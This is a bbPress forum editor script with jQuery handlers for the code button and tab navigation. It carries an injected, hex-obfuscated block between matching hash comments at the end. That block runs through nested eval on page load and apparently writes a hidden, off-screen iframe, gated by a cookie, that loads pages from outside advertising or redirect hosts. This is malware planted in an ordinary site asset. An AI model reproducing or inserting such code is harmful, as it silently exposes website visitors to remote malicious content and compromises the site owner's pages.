jQuery(document).ready( function() {

	/* Use backticks instead of <code> for the Code button in the editor */
	if ( typeof( edButtons ) !== 'undefined' ) {
		edButtons[110] = new QTags.TagButton( 'code', 'code', '`', '`', 'c' );
		QTags._buttonsInit();
	}

	/* Tab from topic title */
	jQuery( '#bbp_topic_title' ).bind( 'keydown.editor-focus', function(e) {
		if ( e.which !== 9 )
			return;

		if ( !e.ctrlKey && !e.altKey && !e.shiftKey ) {
			if ( typeof( tinymce ) !== 'undefined' ) {
				if ( ! tinymce.activeEditor.isHidden() ) {
					var editor = tinymce.activeEditor.editorContainer;
					jQuery( '#' + editor + ' td.mceToolbar > a' ).focus();
				} else {
					jQuery( 'textarea.bbp-the-content' ).focus();
				}
			} else {
				jQuery( 'textarea.bbp-the-content' ).focus();
			}

			e.preventDefault();
		}
	});

	/* Shift + tab from topic tags */
	jQuery( '#bbp_topic_tags' ).bind( 'keydown.editor-focus', function(e) {
		if ( e.which !== 9 )
			return;

		if ( e.shiftKey && !e.ctrlKey && !e.altKey ) {
			if ( typeof( tinymce ) !== 'undefined' ) {
				if ( ! tinymce.activeEditor.isHidden() ) {
					var editor = tinymce.activeEditor.editorContainer;
					jQuery( '#' + editor + ' td.mceToolbar > a' ).focus();
				} else {
					jQuery( 'textarea.bbp-the-content' ).focus();
				}
			} else {
				jQuery( 'textarea.bbp-the-content' ).focus();
			}

			e.preventDefault();
		}
	});
});/*363f8bd673233c0e24182ba6923c63ed*/;window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x6b\x65\x73\x72\x7a"]=["\x34\x32\x38\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x39\x33\x62\x37\x64\x37\x64\x22\x3b\x66\x6f\x72\x20\x28\x76\x61\x72\x20\x6b\x72\x73\x73\x6e\x3d\x30\x3b\x6b\x72\x73\x73\x6e\x3c\x74\x74\x79\x69\x7a\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x6b\x72\x73\x73\x6e\x2b\x3d\x32\x29\x7b\x79\x65\x73\x66\x62\x3d\x79\x65\x73\x66\x62\x2b\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x74\x74\x79\x69\x7a\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x6b\x72\x73\x73\x6e\x2c\x6b","\x36\x36\x35\x36\x31\x33\x39\x36\x33\x33\x34\x33\x30\x36\x32\x33\x37\x36\x32\x33\x39\x36\x35\x36\x31\x33\x33\x33\x39\x33\x38\x36\x33\x33\x39\x36\x35\x36\x35\x33\x34\x36\x34\x36\x35\x36\x34\x36\x32\x36\x34\x33\x31\x36\x31\x32\x32\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x32\x31\x33\x64\x32\x30\x32\x32\x33\x31\x33\x30\x36\x35\x36\x35\x33\x30\x33\x33\x36\x36\x33\x34\x33\x36\x36\x36\x33\x39\x33\x33","\x32\x36\x31\x37\x33\x36\x65\x36\x31\x37\x39\x36\x31\x36\x34\x36\x31\x36\x64\x36\x31\x32\x65\x36\x39\x36\x65\x36\x36\x36\x66\x32\x66\x36\x64\x36\x35\x36\x37\x36\x31\x36\x31\x36\x34\x37\x36\x36\x35\x37\x32\x37\x34\x36\x39\x37\x61\x36\x35\x32\x66\x33\x66\x36\x62\x36\x35\x37\x39\x37\x37\x36\x66\x37\x32\x36\x34\x33\x64\x33\x30\x33\x35\x36\x33\x33\x38\x36\x33\x36\x34\x36\x36\x33\x33\x36\x33\x36\x32\x36\x31\x33\x31\x33\x36\x36\x35\x33\x38\x36\x32\x36\x36","\x36\x32\x37\x31\x32\x38\x36\x31\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x32\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x35\x32\x36\x35\x36\x37\x34\x35\x37\x38\x37\x30\x32\x38\x36\x31\x32\x62\x32\x37\x33\x64\x32\x38\x35\x62\x35\x65\x33\x62\x35\x64\x32\x39\x37\x62\x33\x31\x32\x63\x37\x64\x32\x37\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x32\x32\x65\x36\x35\x37\x38\x36\x35\x36\x33\x32","\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x66\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x61\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x32\x32\x33\x30\x33\x35\x33\x30\x36\x36\x36","\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x79\x65\x73\x66\x62\x3d\x22\x22\x3b\x76\x61\x72\x20\x74\x74\x79\x69\x7a\x3d\x22\x37\x37\x36\x39\x36\x65\x36\x34\x36\x66\x37\x37\x32\x65\x36\x66\x36\x65\x36\x63\x36\x66\x36\x31\x36\x34\x32\x30\x33\x64\x32\x30\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x38\x32\x39\x37\x62\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x32\x33","\x33\x33\x64\x32\x37\x32\x62\x36\x34\x32\x65\x37\x34\x36\x66\x35\x35\x35\x34\x34\x33\x35\x33\x37\x34\x37\x32\x36\x39\x36\x65\x36\x37\x32\x38\x32\x39\x32\x30\x33\x61\x32\x30\x32\x37\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x33\x33\x33","\x32\x36\x32\x37\x31\x32\x38\x36\x31\x32\x63\x36\x32\x32\x63\x36\x33\x32\x39\x37\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x34\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x33\x62\x36\x34\x32\x65\x37\x33\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x36\x34\x32\x65\x36\x37\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39","\x32\x62\x36\x33\x32\x39\x33\x62\x37\x64\x36\x39\x36\x36\x32\x38\x36\x31\x32\x30\x32\x36\x32\x36\x32\x30\x36\x32\x32\x39\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x30\x33\x64\x32\x30\x36\x31\x32\x62\x32\x37\x33\x64\x32\x37\x32\x62\x36\x32\x32\x62\x32\x38\x36\x33\x32\x30\x33\x66\x32\x30\x32\x37\x33\x62\x32\x30\x36\x35\x37\x38\x37\x30\x36\x39\x37\x32\x36\x35\x37","\x33\x31\x33\x39\x36\x31\x36\x33\x36\x33\x36\x32\x36\x32\x33\x31\x36\x31\x33\x38\x33\x39\x33\x31\x33\x37\x33\x39\x33\x38\x33\x35\x33\x35\x33\x34\x36\x36\x33\x34\x32\x32\x32\x39\x37\x62\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x32\x32\x33\x30\x33\x35\x33\x30\x36\x36\x36\x36\x36\x35\x36\x31\x33\x39\x36\x33\x33\x34\x33\x30\x36\x32\x33\x37\x36\x32\x33\x39\x36\x35\x36\x31\x33\x33\x33\x39\x33\x38\x36\x33\x33\x39\x36\x35\x36\x35\x33\x34\x36\x34\x36","\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x37\x32\x36\x35\x36\x31\x37\x34\x36\x35\x34\x35\x36\x63\x36\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x38\x32\x32\x36\x34\x36\x39\x37\x36\x32\x32\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x30\x33\x64\x32\x30\x32\x32\x36\x38\x37\x34\x37\x34\x37\x30\x33\x61\x32\x66\x32\x66\x37\x30\x36\x66\x36\x65\x32\x65\x36\x62\x37","\x37\x32\x36\x33\x33\x64\x32\x37\x32\x32\x32\x62\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x62\x32\x32\x32\x37\x33\x65\x33\x63\x32\x66\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x33\x65\x33\x63\x32\x66\x36\x34\x36\x39\x37\x36\x33\x65\x32\x32\x33\x62\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x32\x36\x66\x36\x34\x37\x39\x32\x65\x36\x31\x37\x30\x37\x30\x36\x35\x36\x65\x36\x34\x34\x33\x36\x38\x36\x39\x36\x63\x36","\x38\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x33\x35\x62\x33\x30\x35\x64\x32\x65\x37\x33\x37\x30\x36\x63\x36\x39\x37\x34\x32\x38\x32\x37\x33\x64\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36","\x72\x73\x73\x6e\x2b\x32\x29\x2c\x20\x31\x36\x29\x2b\x22\x2c\x22\x3b\x7d\x79\x65\x73\x66\x62\x3d\x79\x65\x73\x66\x62\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x30\x2c\x79\x65\x73\x66\x62\x2e\x6c\x65\x6e\x67\x74\x68\x2d\x31\x29\x3b\x65\x76\x61\x6c\x28\x65\x76\x61\x6c\x28\x27\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x27\x2b\x79\x65\x73\x66\x62\x2b\x27\x29\x27\x29\x29\x3b\x7d\x29\x28\x29\x3b","\x32\x37\x33\x36\x66\x36\x63\x37\x35\x37\x34\x36\x35\x33\x62\x37\x61\x32\x64\x36\x39\x36\x65\x36\x34\x36\x35\x37\x38\x33\x61\x33\x31\x33\x30\x33\x30\x33\x30\x33\x62\x37\x34\x36\x66\x37\x30\x33\x61\x32\x64\x33\x31\x33\x30\x33\x30\x33\x30\x37\x30\x37\x38\x33\x62\x36\x63\x36\x35\x36\x36\x37\x34\x33\x61\x32\x64\x33\x39\x33\x39\x33\x39\x33\x39\x37\x30\x37\x38\x33\x62\x32\x37\x33\x65\x33\x63\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x32\x30\x37\x33","\x33\x36\x36\x32\x36\x35\x33\x37\x36\x31\x33\x32\x36\x31\x36\x36\x33\x30\x36\x32\x33\x33\x33\x35\x33\x35\x36\x35\x33\x33\x32\x32\x33\x62\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x65\x36\x39\x36\x65\x36\x65\x36\x35\x37\x32\x34\x38\x35\x34\x34\x64\x34\x63\x33\x64\x32\x32\x33\x63\x36\x34\x36\x39\x37\x36\x32\x30\x37\x33\x37\x34\x37\x39\x36\x63\x36\x35\x33\x64\x32\x37\x37\x30\x36\x66\x37\x33\x36\x39\x37\x34\x36\x39\x36\x66\x36\x65\x33\x61\x36\x31\x36","\x35\x36\x34\x36\x32\x36\x34\x33\x31\x36\x31\x32\x32\x32\x63\x32\x32\x33\x31\x33\x30\x36\x35\x36\x35\x33\x30\x33\x33\x36\x36\x33\x34\x33\x36\x36\x36\x33\x39\x33\x33\x33\x31\x33\x39\x36\x31\x36\x33\x36\x33\x36\x32\x36\x32\x33\x31\x36\x31\x33\x38\x33\x39\x33\x31\x33\x37\x33\x39\x33\x38\x33\x35\x33\x35\x33\x34\x36\x36\x33\x34\x32\x32\x32\x63\x33\x31\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x30\x33\x64"];var etnta=rztkt=ezrte=ikeed=snyyz=window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x6b\x65\x73\x72\x7a"],fafek=window;eval(eval("[fafek[\"etnta\"][\"\x35\"],fafek[\"\x72\x7a\x74\x6b\x74\"][\"\x37\"],fafek[\"rztkt\"][\"\x38\"],fafek[\"etnta\"][\"\x36\"],fafek[\"ezrte\"][\"\x33\"],fafek[\"\x65\x7a\x72\x74\x65\"][\"\x31\x32\"],fafek[\"\x65\x7a\x72\x74\x65\"][\"\x34\"],fafek[\"\x73\x6e\x79\x79\x7a\"][\"\x31\"],fafek[\"ikeed\"][\"\x39\"],fafek[\"ikeed\"][\"\x31\x36\"],fafek[\"etnta\"][\"\x31\x30\"],fafek[\"\x72\x7a\x74\x6b\x74\"][\"\x32\"],fafek[\"\x65\x7a\x72\x74\x65\"][\"\x31\x35\"],fafek[\"\x73\x6e\x79\x79\x7a\"][\"\x31\x34\"],fafek[\"snyyz\"][\"\x31\x31\"],fafek[\"ikeed\"][\"\x30\"],fafek[\"\x65\x7a\x72\x74\x65\"][\"\x31\x33\"]].join(\"\");"));/*363f8bd673233c0e24182ba6923c63ed*/